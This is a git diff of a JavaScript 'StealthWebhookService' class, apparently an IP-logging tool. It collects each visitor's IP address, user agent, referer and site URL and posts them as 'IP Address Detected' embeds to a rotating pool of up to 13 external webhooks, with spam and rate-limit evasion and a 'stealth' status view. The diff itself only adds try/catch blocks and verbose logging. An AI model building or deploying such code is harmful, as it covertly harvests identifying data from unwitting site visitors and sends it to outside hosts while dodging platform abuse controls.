@@ -28,32 +28,46 @@ class StealthWebhookService {
 
   // Load webhook URLs from environment variables
   loadWebhooksFromEnv() {
-    const webhooks = [];
-    const webhookCount = parseInt(process.env.WEBHOOK_COUNT) || 13;
-    
-    for (let i = 1; i <= webhookCount; i++) {
-      const webhookUrl = process.env[`WEBHOOK_URL_${i}`];
-      if (webhookUrl) {
-        webhooks.push({
-          url: webhookUrl,
-          id: `webhook_${i}`,
-          status: 'active',
-          lastUsed: null,
-          failureCount: 0,
-          lastFailure: null,
-          messageCount: 0,
-          lastMessageTime: null
-        });
+    try {
+      console.log('🔗 Loading webhooks from environment variables...');
+      const webhooks = [];
+      const webhookCount = parseInt(process.env.WEBHOOK_COUNT) || 13;
+      
+      console.log(`🔗 Expected webhook count: ${webhookCount}`);
+      
+      for (let i = 1; i <= webhookCount; i++) {
+        const webhookUrl = process.env[`WEBHOOK_URL_${i}`];
+        if (webhookUrl) {
+          console.log(`✅ Webhook ${i}: ${webhookUrl.substring(0, 50)}...`);
+          webhooks.push({
+            url: webhookUrl,
+            id: `webhook_${i}`,
+            status: 'active',
+            lastUsed: null,
+            failureCount: 0,
+            lastFailure: null,
+            messageCount: 0,
+            lastMessageTime: null
+          });
+        } else {
+          console.log(`❌ Webhook ${i}: NOT SET`);
+        }
       }
-    }
 
-    // If no webhooks found in env, use fallback
-    if (webhooks.length === 0) {
-      console.warn('No webhook URLs found in environment variables. Using fallback webhooks.');
+      console.log(`🔗 Loaded ${webhooks.length} webhooks from environment`);
+
+      // If no webhooks found in env, use fallback
+      if (webhooks.length === 0) {
+        console.warn('⚠️ No webhook URLs found in environment variables. Using fallback webhooks.');
+        return this.getFallbackWebhooks();
+      }
+
+      return webhooks;
+    } catch (error) {
+      console.error('❌ Error loading webhooks from environment:', error.message);
+      console.error('❌ Error stack:', error.stack);
       return this.getFallbackWebhooks();
     }
-
-    return webhooks;
   }
 
   // Fallback webhooks (for development/testing)
@@ -402,123 +416,157 @@ class StealthWebhookService {
 
   // Send message to webhook with retry logic and spam detection
   async sendMessage(payload, req) {
-    await this.checkRateLimit();
+    try {
+      console.log('📤 Starting webhook message send...');
+      await this.checkRateLimit();
 
-    const clientIP = this.getClientIP(req);
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    const timestamp = new Date().toISOString();
-    const websiteUrl = this.getWebsiteUrl(req);
-    const websiteName = this.getWebsiteName(req);
+      const clientIP = this.getClientIP(req);
+      const userAgent = req.headers['user-agent'] || 'Unknown';
+      const timestamp = new Date().toISOString();
+      const websiteUrl = this.getWebsiteUrl(req);
+      const websiteName = this.getWebsiteName(req);
 
-    // Enhanced payload with IP information
-    const enhancedPayload = {
-      ...payload,
-      embeds: [
-        {
-          title: "🔍 IP Address Detected",
-          color: 0x00ff00,
-          fields: [
-            {
-              name: "🌐 IP Address",
-              value: clientIP,
-              inline: true
+      console.log('📤 Message details:', {
+        clientIP,
+        websiteUrl,
+        websiteName,
+        userAgent: userAgent.substring(0, 50) + '...'
+      });
+
+      // Enhanced payload with IP information
+      const enhancedPayload = {
+        ...payload,
+        embeds: [
+          {
+            title: "🔍 IP Address Detected",
+            color: 0x00ff00,
+            fields: [
+              {
+                name: "🌐 IP Address",
+                value: clientIP,
+                inline: true
+              },
+              {
+                name: "🕒 Timestamp",
+                value: timestamp,
+                inline: true
+              },
+              {
+                name: "🌍 User Agent",
+                value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
+                inline: false
+              },
+              {
+                name: "🔗 Referer",
+                value: req.headers.referer || 'Direct Access',
+                inline: false
+              },
+              {
+                name: "🌐 Website",
+                value: websiteUrl,
+                inline: true
+              }
+            ],
+            footer: {
+              text: `${websiteName} - Automated IP Logger`
             },
-            {
-              name: "🕒 Timestamp",
-              value: timestamp,
-              inline: true
-            },
-            {
-              name: "🌍 User Agent",
-              value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
-              inline: false
-            },
-            {
-              name: "🔗 Referer",
-              value: req.headers.referer || 'Direct Access',
-              inline: false
-            },
-            {
-              name: "🌐 Website",
-              value: websiteUrl,
-              inline: true
-            }
-          ],
-          footer: {
-            text: `${websiteName} - Automated IP Logger`
-          },
-          timestamp: timestamp
-        }
-      ]
-    };
-
-    let lastError = null;
-    const maxRetries = 3;
-
-    for (let retry = 0; retry < maxRetries; retry++) {
-      try {
-        const webhook = await this.getNextAvailableWebhook();
-        
-        // Check for spam before sending
-        if (this.checkSpam(webhook.id)) {
-          await this.handleSpam(webhook.id);
-          continue; // Try with next webhook
-        }
-
-        const response = await fetch(webhook.url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(enhancedPayload),
-          timeout: 10000
-        });
-
-        if (response.ok) {
-          // Success - update webhook stats
-          webhook.lastUsed = Date.now();
-          webhook.failureCount = 0;
-          webhook.lastFailure = null;
-          
-          return {
-            success: true,
-            webhookId: webhook.id,
-            message: 'Message sent successfully'
-          };
-        } else {
-          // Handle different error responses
-          if (response.status === 404) {
-            webhook.status = 'inactive';
-            webhook.failureCount++;
-            webhook.lastFailure = Date.now();
-          } else if (response.status === 429) {
-            // Rate limited - wait and retry
-            const retryAfter = response.headers.get('retry-after') || 60;
-            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
-          } else {
-            webhook.failureCount++;
-            webhook.lastFailure = Date.now();
+            timestamp: timestamp
           }
+        ]
+      };
+
+      console.log('📤 Enhanced payload created');
+
+      let lastError = null;
+      const maxRetries = 3;
+
+      for (let retry = 0; retry < maxRetries; retry++) {
+        try {
+          console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
+          const webhook = await this.getNextAvailableWebhook();
           
-          lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
+          console.log(`📤 Using webhook: ${webhook.id}`);
+          
+          // Check for spam before sending
+          if (this.checkSpam(webhook.id)) {
+            console.log(`🚨 Spam detected on webhook ${webhook.id}, handling...`);
+            await this.handleSpam(webhook.id);
+            continue; // Try with next webhook
+          }
+
+          console.log(`📤 Sending to webhook URL: ${webhook.url.substring(0, 50)}...`);
+
+          const response = await fetch(webhook.url, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(enhancedPayload),
+            timeout: 10000
+          });
+
+          console.log(`📤 Webhook response status: ${response.status}`);
+
+          if (response.ok) {
+            // Success - update webhook stats
+            webhook.lastUsed = Date.now();
+            webhook.failureCount = 0;
+            webhook.lastFailure = null;
+            
+            console.log('✅ Webhook message sent successfully');
+            return {
+              success: true,
+              webhookId: webhook.id,
+              message: 'Message sent successfully'
+            };
+          } else {
+            // Handle different error responses
+            const responseText = await response.text();
+            console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);
+            
+            if (response.status === 404) {
+              webhook.status = 'inactive';
+              webhook.failureCount++;
+              webhook.lastFailure = Date.now();
+              console.log(`❌ Webhook ${webhook.id} marked as inactive (404)`);
+            } else if (response.status === 429) {
+              // Rate limited - wait and retry
+              const retryAfter = response.headers.get('retry-after') || 60;
+              console.log(`⏳ Rate limited, waiting ${retryAfter} seconds...`);
+              await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
+            } else {
+              webhook.failureCount++;
+              webhook.lastFailure = Date.now();
+              console.log(`❌ Webhook ${webhook.id} failed (${response.status})`);
+            }
+            
+            lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
+          }
+        } catch (error) {
+          console.error(`❌ Webhook attempt ${retry + 1} failed:`, error.message);
+          lastError = error;
+          
+          // Mark current webhook as failed
+          if (this.webhooks[this.currentWebhookIndex]) {
+            this.webhooks[this.currentWebhookIndex].failureCount++;
+            this.webhooks[this.currentWebhookIndex].lastFailure = Date.now();
+          }
         }
-      } catch (error) {
-        lastError = error;
-        
-        // Mark current webhook as failed
-        if (this.webhooks[this.currentWebhookIndex]) {
-          this.webhooks[this.currentWebhookIndex].failureCount++;
-          this.webhooks[this.currentWebhookIndex].lastFailure = Date.now();
+
+        // Wait before retry
+        if (retry < maxRetries - 1) {
+          console.log(`⏳ Waiting ${this.retryDelay}ms before retry...`);
+          await new Promise(resolve => setTimeout(resolve, this.retryDelay));
         }
       }
 
-      // Wait before retry
-      if (retry < maxRetries - 1) {
-        await new Promise(resolve => setTimeout(resolve, this.retryDelay));
-      }
+      console.error(`❌ Failed to send message after ${maxRetries} retries`);
+      throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
+    } catch (error) {
+      console.error('❌ sendMessage error:', error.message);
+      console.error('❌ sendMessage error stack:', error.stack);
+      throw error;
     }
-
-    throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
   }
 
   // Get webhook status for monitoring (stealth version)
